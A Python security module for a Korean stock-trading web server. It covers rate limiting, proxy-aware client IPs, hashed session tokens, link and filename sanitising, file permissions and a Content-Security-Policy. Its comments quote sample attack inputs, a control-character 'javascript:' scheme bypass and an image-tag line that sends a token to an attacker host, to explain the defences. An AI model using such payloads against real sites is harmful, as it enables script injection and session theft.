"""
공개 배포용 보안 장치
---------------------
아테나 시그널을 로컬호스트 밖(오라클 클라우드 등)에 열 때 필요한 최소 방어를
모았습니다. 로컬에서만 쓰는 동안은 아무 동작도 달라지지 않습니다.

공개 모드 (ATHENA_PUBLIC_ORIGIN)
    이 값이 설정되어 있으면 "외부에서 접속하는 서버"로 간주합니다. 이 스위치
    하나로 두 가지가 바뀝니다.
      · CORS 허용 목록에 그 오리진이 추가됩니다 (api.py)
      · 로컬(아이디/비번) 계정도 KIS 주문에 자기 키가 필수가 됩니다
        (storage/user_credentials.must_use_own_keys) — 공개 서버에서는 가입이
        누구에게나 열려 있어서, 서버 키 폴백을 두면 방금 가입한 외부인이
        서버 주인의 계좌로 주문을 낼 수 있기 때문입니다.

레이트 리밋 (프로세스 메모리, 슬라이딩 윈도우)
    로그인·가입은 무차별 대입의 표적입니다. IP·계정별 시도 횟수를 제한합니다.
    uvicorn 단일 프로세스 전제라 외부 저장소(redis 등) 없이 메모리로 충분하고,
    서버가 재시작되면 카운터도 초기화됩니다 — 붙잡아 두는 것보다 단순함이
    낫습니다. 무차별 대입은 재시작 사이에도 다시 한도에 걸립니다.

클라이언트 IP (X-Forwarded-For 는 프록시 뒤에서만)
    nginx 뒤에서는 request.client.host 가 항상 127.0.0.1 이라 X-Forwarded-For
    를 읽어야 하는데, 이 헤더는 **아무나 위조**할 수 있습니다. 그래서
    ATHENA_BEHIND_PROXY=1 일 때만 믿습니다 — deploy/nginx-athena.conf 가
    이 헤더를 실제 접속 IP 로 덮어쓰는 설정과 짝입니다. 프록시 없이 이 값을
    켜면 레이트 리밋이 우회되므로, 켜는 곳은 systemd 유닛 하나뿐이어야 합니다.

세션 토큰 지문 (token_digest)
    DB 에는 토큰 원문 대신 SHA-256 지문만 둡니다. athena.db 파일 하나(또는
    Mongo 컬렉션 하나)가 새면 30일짜리 로그인 세션이 통째로 딸려 나가는데,
    그 세션이 곧 KIS 실계좌 주문 권한이기 때문입니다. 지문만 있으면 훔쳐도
    Authorization 헤더에 넣을 값을 복원할 수 없습니다.

외부 URL (safe_external_url)
    뉴스·커뮤니티·확장프로그램이 실어 보내는 링크는 그대로 <a href> 에 들어갑니다.
    HTML 이스케이프는 `javascript:` 스킴을 막지 못하므로, http/https 가 아닌
    링크는 **저장 단계에서** 버립니다. 화면 쪽에서도 한 번 더 거릅니다.

콘텐츠 보안 정책 (CSP)
    이 서버가 그리는 화면(자동매매 콘솔·구버전 index.html)은 인라인 스크립트로
    되어 있어 script-src 를 조일 수 없습니다. 대신 **새어 나가는 쪽**을 잠급니다 —
    connect-src/img-src/form-action 이 'self' 면, 설령 스크립트가 주입돼도
    localStorage 의 토큰을 공격자 서버로 보낼 방법이 사라집니다.
"""

import hashlib
import os
import threading
import time
from collections import deque

from data_sources import credentials


# ---------------------------------------------------------------------------
# 공개 모드
# ---------------------------------------------------------------------------

def public_origin() -> str:
    """설정된 공개 오리진 (예: https://athena.example.com). 없으면 ""."""
    return credentials.get("ATHENA_PUBLIC_ORIGIN", "").strip().rstrip("/")


def public_mode() -> bool:
    """외부 공개 서버로 동작 중인가 — 보안 기본값을 조이는 스위치."""
    return bool(public_origin())


def behind_proxy() -> bool:
    """신뢰할 수 있는 리버스 프록시(nginx) 뒤인가."""
    return credentials.get_bool("ATHENA_BEHIND_PROXY")


def client_ip(request) -> str:
    """레이트 리밋 키로 쓸 접속자 IP.

    X-Forwarded-For 는 behind_proxy() 일 때만 읽습니다 (모듈 docstring 참고).
    nginx 가 $remote_addr 로 덮어쓰므로 값은 항상 한 개지만, 혹시 체인이 와도
    첫 항목만 씁니다.
    """
    if behind_proxy():
        forwarded = request.headers.get("x-forwarded-for", "")
        if forwarded:
            return forwarded.split(",")[0].strip()
    client = getattr(request, "client", None)
    return getattr(client, "host", None) or "?"


# ---------------------------------------------------------------------------
# 레이트 리밋
# ---------------------------------------------------------------------------

_hits: dict[str, deque] = {}
_lock = threading.Lock()

# 키 종류별 유지 시간을 기억해 두고, 키가 너무 많아지면 오래된 것을 청소합니다.
# (공격자가 IP 를 바꿔가며 키를 무한히 늘리는 것에 대한 메모리 방어)
_MAX_KEYS = 10_000


def _prune(now: float, per_seconds: float):
    for key in [k for k, dq in _hits.items() if not dq or now - dq[-1] > per_seconds]:
        _hits.pop(key, None)


def throttle(key: str, max_calls: int, per_seconds: float) -> int:
    """이번 호출을 기록하고 검사합니다.

    반환: 한도 안이면 0, 초과면 기다려야 할 초(>=1).
    초과한 호출은 기록하지 않습니다 — 막힌 시도가 차단을 연장하지 않아,
    "얼마나 기다리면 되는지"가 항상 참말이 됩니다.
    """
    now = time.monotonic()
    with _lock:
        dq = _hits.get(key)
        if dq is None:
            if len(_hits) >= _MAX_KEYS:
                _prune(now, per_seconds)
            dq = _hits[key] = deque()
        while dq and now - dq[0] > per_seconds:
            dq.popleft()
        if len(dq) >= max_calls:
            return max(int(per_seconds - (now - dq[0])) + 1, 1)
        dq.append(now)
    return 0


def over_limit(key: str, max_calls: int, per_seconds: float) -> int:
    """기록 없이 검사만. 반환 규칙은 throttle() 과 같습니다.

    로그인 실패 카운터처럼 "결과를 본 뒤에만 기록"해야 하는 한도에 씁니다 —
    성공한 로그인이 실패 카운터를 채우면 안 됩니다.
    """
    now = time.monotonic()
    with _lock:
        dq = _hits.get(key)
        if not dq:
            return 0
        while dq and now - dq[0] > per_seconds:
            dq.popleft()
        if len(dq) >= max_calls:
            return max(int(per_seconds - (now - dq[0])) + 1, 1)
    return 0


def record(key: str):
    """검사 없이 기록만 (over_limit 과 짝)."""
    now = time.monotonic()
    with _lock:
        dq = _hits.get(key)
        if dq is None:
            if len(_hits) >= _MAX_KEYS:
                _prune(now, 3600)
            dq = _hits[key] = deque()
        dq.append(now)
        # over_limit 이 지나간 항목을 지워 주지만, 기록만 쌓이는 키가 무한히
        # 자라지 않도록 상한을 둡니다 (실패 카운터 한도는 수십 회 수준입니다)
        while len(dq) > 100:
            dq.popleft()


def reset():
    """테스트용 — 모든 카운터를 비웁니다."""
    with _lock:
        _hits.clear()


# ---------------------------------------------------------------------------
# 세션 토큰 지문
# ---------------------------------------------------------------------------

def token_digest(token: str) -> str:
    """저장·조회에 쓸 토큰 지문 (SHA-256 hex).

    비밀번호와 달리 느린 해시(PBKDF2)를 쓰지 않는 이유: 토큰은 사람이 고른
    문자열이 아니라 secrets.token_urlsafe(32) — 256비트 난수입니다. 사전 대입이
    성립하지 않으므로 한 번의 SHA-256 으로 충분하고, 요청마다 도는 경로라
    빨라야 합니다.
    """
    return hashlib.sha256((token or "").encode("utf-8")).hexdigest()


def token_lookup_keys(token: str) -> list[str]:
    """DB 에서 찾아볼 값들 — [지문, 원문].

    지문 저장으로 넘어오기 전에 발급된 세션이 아직 살아 있습니다. 두 값을 모두
    조회해서 옛 세션을 로그아웃시키지 않고, 찾은 것이 원문이면 그 자리에서
    지문으로 바꿔 둡니다 (사용하는 순간 저절로 이전됩니다).
    """
    token = (token or "").strip()
    if not token:
        return []
    return [token_digest(token), token]


# ---------------------------------------------------------------------------
# 외부 URL
# ---------------------------------------------------------------------------

_SAFE_SCHEMES = ("http://", "https://")


def safe_external_url(url: str, max_length: int = 500) -> str:
    """저장·표시해도 되는 링크만 통과시킵니다. 아니면 빈 문자열.

    `javascript:` · `data:` · `vbscript:` 는 <a href> 에 들어가는 순간 클릭 한 번이
    스크립트 실행이 됩니다. HTML 이스케이프로는 막히지 않습니다 — 이스케이프는
    꺾쇠와 따옴표를 다룰 뿐 스킴을 보지 않기 때문입니다.

    공백·탭·개행을 먼저 걷어내는 이유: `java\\tscript:alert(1)` 처럼 스킴 사이에
    제어문자를 끼워 넣으면 브라우저는 무시하고 실행하지만, 순진한 문자열 검사는
    통과시킵니다.
    """
    raw = (url or "").strip()
    if not raw:
        return ""
    # 제어문자 제거 후 스킴 판정 (판정용 사본 — 저장은 원본을 씁니다)
    probe = "".join(ch for ch in raw if ord(ch) > 0x20).lower()
    if not probe.startswith(_SAFE_SCHEMES):
        return ""
    # 헤더·속성 주입을 막기 위해 제어문자가 섞인 링크는 통째로 버립니다
    if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in raw):
        return ""
    return raw[:max_length]


def safe_filename(name: str, fallback: str = "download") -> str:
    """Content-Disposition 에 넣어도 되는 파일명.

    외부에서 받아온 이름을 그대로 헤더에 실으면 따옴표·개행으로 헤더를 쪼갤 수
    있습니다. 경로 구분자도 함께 지웁니다.
    """
    cleaned = "".join(
        ch for ch in (name or "")
        if ord(ch) >= 0x20 and ord(ch) != 0x7F and ch not in '"\\/:*?<>|'
    ).strip()
    return cleaned[:120] or fallback


# ---------------------------------------------------------------------------
# 파일 권한
# ---------------------------------------------------------------------------

def harden_file(path) -> None:
    """비밀이 든 파일을 소유자만 읽게 만듭니다 (chmod 600).

    api_keys.json 에는 MONGODB_URI 와 ATHENA_CRED_KEY 가 들어 있습니다. 후자는
    **모든 사용자의 KIS 키를 푸는 복호화 키**라, 같은 서버에 계정이 하나 더 있는
    것만으로 증권 계좌가 열립니다. 기본 umask(022)로 만들어지면 누구나 읽습니다.

    윈도우에서는 POSIX 권한 개념이 없어 chmod 가 사실상 읽기전용 플래그로만
    동작합니다 — 그래서 실패해도 넘어갑니다. 이 방어가 필요한 곳은 여러 계정이
    있는 리눅스 서버입니다.
    """
    if os.name == "nt":
        return
    try:
        os.chmod(path, 0o600)
    except OSError:
        pass


# ---------------------------------------------------------------------------
# 콘텐츠 보안 정책
# ---------------------------------------------------------------------------

# 이 서버가 직접 그리는 화면용. 각 줄의 이유:
#   default-src 'self'      기본은 같은 오리진만
#   script-src  'unsafe-inline' 포함 — 콘솔 페이지가 인라인 <script> 로 되어
#                           있습니다. 여기를 조이려면 페이지를 통째로 고쳐야 해서,
#                           지금은 "실행은 막지 못해도 **내보내기**는 막는다" 전략입니다
#   connect-src 'self'      XSS 가 성공해도 토큰을 밖으로 fetch 할 수 없습니다
#   img-src     'self' data:  <img src="https://공격자/?t=토큰"> 유출 경로 차단
#   form-action 'self'      숨겨진 form 으로 값을 빼돌리는 경로 차단
#   base-uri    'none'      <base> 를 심어 상대경로 스크립트를 가로채는 수법 차단
#   object-src  'none'      플러그인 임베드 제거
#   frame-ancestors 'none'  클릭재킹 (X-Frame-Options 의 최신판)
_FONT_CDN = "https://cdn.jsdelivr.net https://fonts.gstatic.com"
_STYLE_CDN = "https://cdn.jsdelivr.net https://fonts.googleapis.com"

CONTENT_SECURITY_POLICY = "; ".join([
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline'",
    f"style-src 'self' 'unsafe-inline' {_STYLE_CDN}",
    f"font-src 'self' data: {_FONT_CDN}",
    "img-src 'self' data:",
    "connect-src 'self'",
    "form-action 'self'",
    "base-uri 'none'",
    "object-src 'none'",
    "frame-ancestors 'none'",
])

# 쓰지 않는 브라우저 기능은 꺼 둡니다 — 주입된 스크립트가 카메라·위치를
# 요구하는 창을 띄우는 것만 막아도 사고의 모양이 달라집니다.
PERMISSIONS_POLICY = ("accelerometer=(), camera=(), geolocation=(), gyroscope=(), "
                      "magnetometer=(), microphone=(), payment=(), usb=()")
